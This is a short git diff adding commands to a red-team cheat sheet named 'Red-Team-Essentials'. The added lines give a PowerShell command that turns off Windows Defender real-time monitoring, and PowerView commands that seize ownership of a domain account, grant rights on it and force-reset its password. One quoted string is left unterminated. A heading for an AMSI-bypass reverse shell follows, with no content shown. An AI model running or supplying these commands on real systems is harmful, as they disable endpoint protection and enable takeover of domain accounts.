@@ -1,5 +1,16 @@
 # Red-Team-Essentials
 
+#Disable Defender 
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+#Fore-Change PAssword - generic All 
+Set-DomainObjectOwner -Identity stgadm -OwnerIdentity hexninja
+Add-DomainObjectAcl -TargetIdentity stgadm -PrincipalIdentity hexninja
+$newpass = ConvertTo-SecureString -String 'Password123! -AsPlainText -Force
+Set-DomainUserPassword -Identity stgadm -AccountPassword $newpass
+
+
 #Powershell Reverse Shell one Liner (AMSI Bypass)
 
 
